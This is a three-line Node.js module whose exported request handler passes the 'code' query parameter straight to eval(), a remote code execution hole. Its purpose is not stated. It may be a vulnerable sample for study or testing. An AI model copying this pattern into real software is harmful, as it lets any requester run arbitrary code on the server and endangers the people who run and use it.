module.exports = function handle(req) {
  eval(req.query.code);
};
